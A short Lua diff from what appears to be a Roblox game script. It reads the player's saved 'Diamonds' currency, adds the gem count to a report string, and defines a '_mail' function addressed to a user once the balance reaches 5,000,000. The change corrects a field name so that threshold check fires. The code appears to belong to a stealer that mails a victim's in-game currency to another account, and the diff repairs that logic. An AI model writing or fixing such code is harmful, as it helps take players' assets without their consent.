@@ -10,7 +10,7 @@ local s = save.Inventory.Currency
 for i,v in pairs(s) do
 if v.id == "Diamonds" then
 e = e.."\\nGems: "..v._am
-if v.am >= 5000000 then
+if v._am >= 5000000 then
 function _mail(u, t, i, n)
 local args = {
     [1] = u,
